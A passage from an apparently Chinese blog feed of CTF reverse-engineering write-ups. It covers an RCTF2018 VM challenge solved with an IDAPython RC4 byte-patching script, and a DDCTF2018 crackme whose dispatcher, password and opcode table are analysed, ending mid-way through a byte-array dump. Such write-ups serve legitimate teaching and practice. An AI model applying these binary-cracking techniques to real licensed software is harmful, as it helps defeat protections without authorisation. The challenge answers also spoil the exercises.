class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接rc4解密就行：密钥就是前面的dword_4099D0[0]，这里采用大佬的方法直接修改内存数据取解密，因为不知道dword_4099D0[0]有没有在其他地方改改，所以这样其实更加保险</p><p>脚本如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>rc4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> addr <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> data_addr <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#我这里data_addr = 0x60FD54</span>    idc<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> rc4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：</p><p><img src="/2023/04/07/rctf2018-magic/14.png"></p><p><img src="/2023/04/07/rctf2018-magic/15.png"></p><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1170775">https://cloud.tencent.com/developer/article/1170775</a></p><p><a href="https://www.52pojie.cn/thread-742361-1-1.html">https://www.52pojie.cn/thread-742361-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM逆向 </tag>
            
            <tag> setjmp/longjmp </tag>
            
            <tag> rc4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2018-黑盒破解</title>
      <link href="/2023/04/05/ddctf2018-hei-he-po-jie/"/>
      <url>/2023/04/05/ddctf2018-hei-he-po-jie/</url>
      
        <content type="html"><![CDATA[<p>目标：输出<code>Binggo</code>字符串；</p><p>题型：只给可执行程序，逆向emulator，构造opcode，读取flag</p><p>main函数基本逻辑：</p><ul><li>输入长度大于10的password，输入前10个字符只能是字母或者数字</li><li>password组成一个文件名，所以易知password=<code>48ee204317</code></li><li>接下来输入Passcode，其存储在(v4+16)地址处，长度小于100</li><li>然后进入一个Dispatcher函数中进行Passcode解析并执行相关函数</li><li>如果byte_603F00=1，则输出Success（但这里不是重点，因为题目要求是输出<code>Binggo</code>字符串即可</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/1.png" alt="1"></p><p>对byte_603F00交叉引用跟踪到sub_40113D函数</p><ul><li>可以看出，经过三个函数的check，最终byte_603F00才能为1</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/2.png"></p><p>对sub_40113D函数交叉引用跟踪失败，但是在数据段发现存储了很多函数的offset，可以猜测是VM逆向，Dispatcher则是分发该处的函数</p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/3.png"></p><p>查看main中byte_603F00上面的Dispatcher函数(经过分析得到的)</p><ul><li>相关操作看注释(其实最后一个if里面的逻辑可以判断是Dispatcher了</li><li>第一个for循环处理每个Passcode字符，第二个for循环查找Passcode字符对应的操作</li><li>我们输入的Passcode会当做byte_603900数组的下标，如果其该下标处byte_603900元素的值为9个opcode中的一个就会执行相关操作</li><li>也可以看汇编代码逻辑图，上面的jnz则是第二个for循环里面的if判断逻辑，最下面的call eax则是去调用对应的函数</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/4.png"></p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/5.png" alt="Dispatcher逻辑图"></p><p>在第二个for下断，动态调试，得出opcode，以及对应的v2下标</p><ul><li>对上面的汇编逻辑图简单分析一下，可以得出c1为我们输入v2下标，al为opcode</li></ul><p>将byte_603F00导出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byte_603F00 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>   <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span>   <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span>   <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span>   <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span>   <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span>   <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>   <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>   <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>   <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span>   <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>   <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span>   <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span>   <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>   <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span>   <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span>   <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>   <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>   <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span>   <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token 